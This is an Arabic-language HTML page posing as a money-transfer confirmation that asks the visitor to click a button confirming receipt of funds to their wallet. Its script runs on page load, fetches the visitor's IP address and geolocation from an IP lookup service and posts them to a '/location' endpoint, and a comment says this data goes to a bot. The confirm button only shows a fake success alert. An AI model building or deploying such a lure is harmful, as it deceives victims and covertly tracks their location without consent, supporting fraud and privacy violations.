<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تأكيد التحويل</title>
  <style>
    body {
      background-color: #f2f2f2;
      font-family: Tahoma, sans-serif;
      text-align: center;
      padding: 50px;
    }
    .card {
      background-color: #ffffff;
      border-radius: 10px;
      padding: 40px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .btn {
      background-color: #2aabee;
      color: white;
      padding: 15px 25px;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 20px;
    }
    .btn:hover {
      background-color: #1a8bd4;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>تأكيد تحويل الأموال</h2>
    <p>يرجى الضغط على الزر لتأكيد استلام التحويل إلى محفظتك.</p>
    <button class="btn" onclick="confirmClick()">تأكيد التحويل</button>
  </div>

  <script>
    // إرسال IP والموقع للبوت
    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        fetch('/location', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(data)
        });
      });

    function confirmClick() {
      alert("✅ تم تأكيد التحويل");
    }
  </script>
</body>
</html>
